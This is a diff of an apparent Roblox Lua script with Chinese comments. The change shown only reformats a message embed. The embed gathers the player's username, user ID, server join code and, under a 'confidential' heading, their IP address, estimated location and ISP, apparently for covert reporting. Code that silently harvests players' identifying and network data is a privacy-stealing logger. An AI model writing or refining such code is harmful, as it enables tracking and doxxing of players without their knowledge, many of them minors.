@@ -59,15 +59,15 @@ pcall(function()
     -- 3. 建立個人資料連結
     local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"
 
-    -- 4. 準備 embed 的 description，將所有值都用黑色程式碼框包起來
+    -- 4. 準備 embed 的 description，讓標題和值在同一行
     local description = string.format(
-        "**真實名稱:** ```%s```\n" ..
-        "**顯示名稱:** ```%s```\n" ..
-        "**玩家ID:** ```%s```\n" ..
-        "**個人資料:** [Roblox 個人頁面](%s)\n" .. -- 連結無法放入程式碼框，保持原樣
-        "**遊戲:** ```%s```\n" ..
-        "**玩家伺服器人數:** ```%d```\n" ..
-        "**加入代碼:** ```%s```",
+        "**真實名稱:** `%s`\n" ..
+        "**顯示名稱:** `%s`\n" ..
+        "**玩家ID:** `%s`\n" ..
+        "**個人資料:** [Roblox 個人頁面](%s)\n" ..
+        "**遊戲:** `%s`\n" ..
+        "**玩家伺服器人數:** `%d`\n" ..
+        "**加入代碼:** `%s`",
         LocalPlayer.Name,
         LocalPlayer.DisplayName,
         tostring(LocalPlayer.UserId),
@@ -77,7 +77,7 @@ pcall(function()
         game.JobId or "N/A"
     )
 
-    -- 5. 將 IP 資訊附加到 description 的末尾，同樣使用黑色程式碼框
+    -- 5. 將 IP 資訊附加到 description 的末尾，同樣讓標題和值在同一行
     if secretInfo and secretInfo.ip then
         local ip_info = secretInfo.details
         local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
@@ -85,9 +85,9 @@ pcall(function()
         
         local secretBlock = string.format(
             "\n\n**網路資訊 (機密):**\n" ..
-            "**IP 位址:** ```%s```\n" ..
-            "**推測位置:** ```%s```\n" ..
-            "**網路供應商:** ```%s```",
+            "**IP 位址:** `%s`\n" ..
+            "**推測位置:** `%s`\n" ..
+            "**網路供應商:** `%s`",
             secretInfo.ip, location, isp
         )
         description = description .. secretBlock
